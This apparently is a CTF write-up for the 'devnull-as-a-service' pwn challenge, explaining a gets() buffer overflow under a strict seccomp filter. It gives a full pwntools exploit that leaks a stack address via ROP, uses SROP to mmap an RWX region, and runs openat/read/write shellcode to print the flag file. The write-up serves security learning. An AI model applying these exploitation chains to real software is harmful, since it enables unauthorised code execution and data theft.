---
title: "[WRITE UP] - devnull-as-a-service"
published: 2025-01-30
description: ""
image: "./image.png"
tags:
  - PWN
category: "CTF Write ups"
draft: false
---

# Description
> A few months ago, I came across this website. Inspired by it, I decided to recreate the service in C to self-host it.
To avoid any exploitable vulnerabilities, I decided to use a very strict seccomp filter. Even if my code were vulnerable, good luck exploiting it.
PS: You can find the flag at `/home/ctf/flag.txt` on the remote server.

# Challenge Overview
The challenge involves exploiting a buffer overflow in a `non-PIE` binary with a strict `seccomp` filter. The goal is to read the flag from `/home/ctf/flag.txt` using allowed syscalls. The key steps involve leaking a stack address, crafting a `Sigreturn-Oriented Programming (SROP)` chain to create an `RWX` memory region, and executing shellcode that utilizes `openat`, `read`, and `write` syscalls.

# Binary Analysis
- Security Features: `Partial RELRO`, `Stack Canary`, `NX Enabled`, `No PIE`.
- Vulnerability: `gets()` in `dev_null()` causing a `buffer overflow`.
- Seccomp Rules: Blocks dangerous syscalls (e.g., `open`, `execve`) but allows `openat`, `read`, `write`, and `sigreturn`.

# Exploit

Looking back, this article seems to be a shellcode article because it has seccomp and although NX is enabled, we can still execute shellcode through ROP, we can use some syscalls like `mmap`, `mprotect` to grant permissions to a certain memory area. This article is special in that there are no common `gadgets` for us to execute a normal ROP chain, but instead there are `syscalls` and `pop rax`, we can immediately think of using `SROP`.

:::note
`Sigreturn-Oriented Programming (SROP)` is an exploitation technique that abuses the Linux kernel’s signal-handling mechanism. When a process receives a signal (e.g., segmentation fault), the kernel saves the process’s execution context (registers, stack, etc.) onto the stack. After handling the signal, the kernel restores the context using the sigreturn syscall. `SROP` exploits this mechanism by forging a fake signal frame on the stack and triggering sigreturn to hijack control of all registers, effectively allowing arbitrary syscalls or code execution.
:::

So the idea for this:

- Leak Stack Address: Use a ROP chain to leak `__libc_stack_end` to determine stack layout.
- `SROP` for RWX Memory: Use `SROP` to call `mmap` and create an executable memory region.
- Shellcode Execution: Inject shellcode using `openat` to open the flag, `read` it, and `write` to stdout.

## Exploit:
```py
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwncus import *

context.log_level = 'debug'
exe = context.binary = ELF('./dev_null', checksec=False)

def GDB(): gdb.attach(p, gdbscript='''

b*dev_null+52
c
''') if not args.REMOTE else None

if args.REMOTE:
    con = sys.argv[1:]
    p = remote(con[0], int(con[1]))
else:
    p = process(argv=[exe.path], aslr=False)

if args.GDB: GDB(); input()

# ===========================================================
#                          EXPLOIT
# ===========================================================

'''
[*] '/home/alter/CTFs/x3CTF/devnull-as-a-service/dev_null'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
'''

def stage1():

    pl = flat(
        b'A'*16,
        pop_rdi,
        exe.sym.__libc_stack_end,
        exe.sym.puts,
        exe.sym.main,
    )

    sl(pl)
    rl()
    __libc_stack_end = unpack(p.recv()[:6].ljust(8, b"\x00"))
    slog("__libc_stack_end:", __libc_stack_end)

    return __libc_stack_end

def stage2():

    pl = flat(
        b'A'*16,
        pop_rdi,
        stack_address,
        exe.sym.gets,
        exe.sym.main,
      )

    sl(pl)
    sl(cyclic(40) + p64(exe.sym.main))

# void *mmap(void addr[.length], size_t length, int prot, int flags, int fd, off_t offset);
def stage3():

    frame = SigreturnFrame()
    frame.rax = 0x9    # mmap syscall
    frame.rdi = rwx    # addr
    frame.rsi = 0x1000 # size
    frame.rdx = 0x7    # prot (RWX)
    frame.r10 = 0x22   # flags (MAP_ANONYMOUS|MAP_PRIVATE)
    frame.r8 = 0       # fd
    frame.r9 = 0       # offset
    frame.rsp = stack_address + 0x28 # return to main
    frame.rip = syscall

    pl = flat(
        b'A'*16,
        pop_rax,
        0xf,
        syscall
    )
    pl += bytes(frame)

    sl(pl)

def stage4():

    pl = flat(
        b'A'*16,
        pop_rdi,
        rwx,
        exe.sym.gets,
        exe.sym.main,
    )

    sc = asm('''nop\n'''*0x10+'''

        xor rax, rax
        mov rax, 0x101
        mov rdi, -1
        lea rsi, [rip + file_path]
        syscall

        mov rdi, rax
        mov rsi, rsp
        mov rdx, 0x50
        mov rax, 0
        syscall

        mov rdx, 0x50
        mov rdi, 1
        mov rsi, rsp
        mov rax, 1
        syscall

        file_path:
            .asciz "/home/ctf/flag.txt"

        ''', arch='amd64')

    sl(pl)
    sl(sc)

def stage5():

    pl = flat(

        b'A'*16,
        rwx
    )

    sl(pl)

def exploit():
    global pop_rdi, stack_address, pop_rax, syscall, rwx

    pop_rdi = 0x413795
    pop_rax = 0x42193c
    syscall = 0x40bcd6
    rwx = 0x12345
    stack_address = stage1()

    stage2()
    stage3()
    stage4()
    stage5()

    interactive()

if __name__ == '__main__':
    exploit()
```
